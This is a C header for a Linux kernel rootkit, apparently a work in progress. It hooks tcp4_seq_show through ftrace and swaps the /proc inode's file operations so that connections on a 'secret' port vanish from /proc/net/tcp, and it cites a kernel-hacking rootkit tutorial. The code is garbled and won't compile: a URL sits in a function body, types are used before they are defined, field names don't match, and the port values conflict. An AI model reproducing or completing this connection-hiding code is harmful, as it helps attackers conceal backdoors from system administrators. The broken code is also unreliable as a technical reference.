#ifndef HIDE_PROC_NET_H
#define HIDE_PROC_NET_H
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/namei.h>
#include <linux/seq_file.h>
#include <net/tcp.h>
#include <linux/proc_fs.h>
#include <linux/list.h>
#include <linux/sched.h>
#include <linux/kmod.h>
#include <net/udp.h>
#include <net/tcp.h>
#include <linux/seq_file.h>
#include <linux/slab.h>
#include <linux/kallsyms.h>
#define SECRET_PORT 2222
static asmlinkage long (*org_tcp4_seq_show)(struct seq_file *seq, void *v);
asmlinkage int hook_org_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (sk != 0x1 && sk->sk_num == 0x1f90)
        return 0;
    return org_tcp4_seq_show(seq, v);

}
static void notrace fh_ftrace(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct pt_regs *regs)
{
    struct hook *hook = container_of(ops, struct ftrac_hooks, ops);
    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long) hook->function;
}
int install_hook(struct hook *hook)
{
    int err;
    err = get_addr(hook);
    if (!err)
        return -1;
    hook->ops.func = fh_ftrace;
    hook->ops.flags = FTRACE_OPS_FL_SAVE_REGS
                | FTRACE_OPS_FL_RECURSION_SAFE
                | FTRACE_OPS_FL_IPMODIFY;
    err = ftrace_set_filter_ip(&hook->ops, hook->addr, 0, 0);
    ///contiue
    https://github.com/xcellerator/linux_kernel_hacking/blob/461ace61fa89c2c23d061047093ca4d4be321770/3_RootkitTechniques/3.7_char_interfering/ftrace_helper.h#L104

}
struct hook
{
    const char* name;
    void * function;
    void * org_function;
    unsigned long addr;
    struct ftrace_ops ops;
};


int get_addr(struct hook *hook)
{
    hook->addr = kallsyms_lookup_name(hook->name);
    if (!hook->addr)
    {
        printk(KERN_ALERT "rk:cant get the symbol: %s\n", hook->name);
        return -ENOENT;
    }
    *((unsigned long *) hook->origin_seq_show) = hook->addr;
    return 1;
}



int (*origin_seq_show)(struct seq_file *f_seq, void *v);
/*static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos);
static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos);
static void ct_seq_stop(struct seq_file *f_seq, void *v);
static int ct_seq_show(struct seq_file *f_seq, void *v);
int ct_open(struct inode *inode, struct file *file);*/
unsigned long *tcp4_seq_show;

static void *ct_seq_start(struct seq_file *f_seq, loff_t *pos)
{
    loff_t *spos = kmalloc(sizeof(loff_t), GFP_KERNEL);
    if(!spos)
        return  NULL;
    *spos = *pos;
    return spos;
}
static void *ct_seq_next(struct seq_file *f_seq, void *v, loff_t *pos)
{
    loff_t *spos = v;
    *pos = ++*spos;
    return spos;
}
static void ct_seq_stop(struct seq_file *f_seq, void *v)
{
    kfree(v);
}
static int ct_seq_show(struct seq_file *f_seq, void *v)
{

    char needle [ 150 ];
    loff_t *spos = v;
    int ret;
    printk(KERN_ALERT "used the seq_show");

    ret = origin_seq_show(f_seq, v);
    //need to add here call to real show
    // The start of the record = the start of the buffer + the amount already-the size of each record.
    snprintf ( needle , 150 , ":%04X" , SECRET_PORT );
    if (strnstr(f_seq->buf + f_seq->count -150, needle, 150))
    {
        printk(KERN_ALERT "found:  %d ", SECRET_PORT);
        f_seq->count -=150;//decrese the count by 150 (equal to line) 
        //remove
    }
    seq_printf(f_seq, "%lld\n", (long long)*spos);/* <---- place to attack! ---->*/
    return 0;
}
struct seq_operations seq_ops = {
    .start = ct_seq_start,
    .next = ct_seq_next,    
    .stop = ct_seq_stop,   
    .show = ct_seq_show    /*  <----postion to attack---->      */
};

int ct_open(struct inode *inode, struct file *file)
{
    printk(KERN_ALERT "used the ct_open");
    return seq_open(file , &seq_ops);
}
/*static const struct file_operations *fops = {
    .owner = THIS_MODULE,
    .open = ct_open,

}*/



struct file_operations *org_fops, proc_fops;  
struct inode *proc_inode;
struct file *file;                                                         
struct path p; 
int set_ops(char *path)
{
    
    if(kern_path(path, 0, &p))
            return 0;
    printk(KERN_ALERT "open file secessfully");
        //get the inode
    proc_inode = p.dentry->d_inode;
    printk(KERN_ALERT "got the inode");

        //get a copy of fop from inode

    proc_fops = *proc_inode->i_fop;
    printk(KERN_ALERT "got the fops");
    org_fops = proc_inode->i_fop;

    proc_fops.open = ct_open;

        //backup the fop

    printk(KERN_ALERT "save the org fops");

    proc_inode->i_fop = &proc_fops;
    printk(KERN_ALERT "hook the org fops");
    return 1;
}
void get_seq(void)
{
    tcp4_seq_show = (unsigned long *) kallsyms_lookup_name("tcp4_seq_show");
    printk(KERN_ALERT "rk:%p", tcp4_seq_show);
    tcp4_seq_show = (long unsigned*)ct_seq_show;
    printk(KERN_ALERT "rk:%p", tcp4_seq_show);

}
void hook_seq(void)
 {     
                                    
    //proc_fops->open = ct_open;
    printk(KERN_ALERT "hooked!");

    //ern_path(path, 0, p);                                         
    //entry = PDE(p->dentry->d_inode);
    //org_fops = entry->proc_dir_fops; 
    //origin_seq_show = origin_seq_ops.show;                                      
    //PDE_DATA(p->dentry->d_inode)->seq_ops= seq_ops;                                       
 } 
 void unhook_seq(void)
 {
     proc_inode->i_fop = org_fops;
     printk(KERN_ALERT "unhooked!");
 }            
 
                                                  
#endif